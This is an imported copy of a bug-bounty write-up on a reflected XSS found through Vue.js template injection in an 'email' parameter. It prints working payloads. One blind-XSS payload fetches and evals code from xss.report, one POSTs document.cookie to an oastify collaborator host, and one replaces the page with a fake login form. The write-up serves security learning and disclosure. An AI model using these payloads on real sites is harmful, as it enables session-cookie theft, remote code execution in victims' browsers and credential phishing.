---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2023-01-03_vue-js-reflected-xss.md
original_filename: 2023-01-03_vue-js-reflected-xss.md
title: Vue JS Reflected XSS
category: documents
detected_topics:
- xss
- command-injection
- cors
- clickjacking
- api-security
tags:
- imported
- documents
- xss
- command-injection
- cors
- clickjacking
- api-security
language: en
raw_sha256: 65c545515bfc5b3bf9f514492a8e919b484d9a3c0ae8e8b3244e6cf3d566b6b1
text_sha256: 29d6eaf1274d6c0c9be12761e864c4a671b30843a077f48a7dcebf7077e997ef
ingested_at: '2026-06-28T07:32:17Z'
sensitivity: unknown
redactions_applied: true
---

# Vue JS Reflected XSS

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2023-01-03_vue-js-reflected-xss.md
- Source Type: markdown
- Detected Topics: xss, command-injection, cors, clickjacking, api-security
- Ingested At: 2026-06-28T07:32:17Z
- Redactions Applied: True
- Raw SHA256: `65c545515bfc5b3bf9f514492a8e919b484d9a3c0ae8e8b3244e6cf3d566b6b1`
- Text SHA256: `29d6eaf1274d6c0c9be12761e864c4a671b30843a077f48a7dcebf7077e997ef`


## Content

---
title: "Vue JS Reflected XSS"
url: "https://medium.com/@sid0krypt/vue-js-reflected-xss-fae04c9872d2"
authors: ["sid0krypt (@Siddhar07949650)"]
bugs: ["Reflected XSS", "Blind XSS", "CORS misconfiguration", "UI redressing"]
publication_date: "2023-01-03"
added_date: "2023-01-06"
source: "pentester.land/writeups.json"
original_index: 1706
scraped_via: "browseros"
---

# Vue JS Reflected XSS

Top highlight

Vue JS Reflected XSS
sid0krypt
Follow
3 min read
·
Jan 3, 2023

192

1

Press enter or click to view image in full size

Hi guys, in this writeup I will be showing you how I was able to get a reflected XSS on a VueJS application.

I found a vulnerable param named ‘?email=’ which was filtering all the tags. So I referred portswigger’s XSS cheatsheet to get hints for the payloads.

The first thing you should do is check the technologies used in that application. So in my case it was an application which was based on VueJS.

These two payloads were found to be working :

{{_Vue.h.constructor`alert(1)`()}}
{{$emit.constructor`alert(1)`()}}
Press enter or click to view image in full size

Template Injection payloads:

{{_Vue.h.constructor('x','console.log("HI this is sid0krypt")')(this)}}
{{_Vue.h.constructor('x','console.log(x)')(this)}}
Press enter or click to view image in full size

I don’t have any knowledge with VueJS so after some research I got to know that the constructor function works similar to <script></script>.

Get sid0krypt’s stories in your inbox

Join Medium for free to get updates from this writer.

Subscribe

Remember me for faster sign in

So to create a BLIND XSS payload you could simply just use this :

{{$emit.constructor`function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//xss.report/s/sid0krypt");a.send()`()}}

As the target was using a WAF I couldn't create a Cross Origin Request:

Press enter or click to view image in full size

So in this scenario you can use the fetch request with no-cors mode which will bypass the restriction of Cross origin Resource Sharing.

  fetch('https://{collaborator link}', {
  method: 'POST',
  mode: 'no-cors',
  body: document.cookie
  });

The Final Payload with the fetch request would be :

{{$emit.constructor`fetch(%27https://8v4y3qmogobk2g6bewqtqa83quwkk9.oastify.com%27,%20{%20method:%20%27POST%27,%20mode:%20%27no-cors%27,%20body:%20document.cookie%20});`()}}
Press enter or click to view image in full size

So to escalate further more , I was able to perform UI redressing which was lead to completely modifying the HTML content to login page which I created and it would point to www.target.com/login so it looks like a legitimate login page.

{{$emit.constructor`history.replaceState(null, null, '../../../login');
document.body.innerHTML = "</br></br></br></br></br><h1>Please login to continue and this is a POC by sid0krypt😌💕</h1><form>Username: <input type='text'>Password=***REDACTED*** type='password'></form><input value='submit' type='submit'>"`()}}
Press enter or click to view image in full size

Thank you for reading my writeup ! Please do ping me if you have queries regarding anything.

Here are my socials :

LinkedIn : https://www.linkedin.com/in/siddharth-pasalapudi-365344196/

Twitter: https://twitter.com/Siddhar07949650

References :

https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/README.md
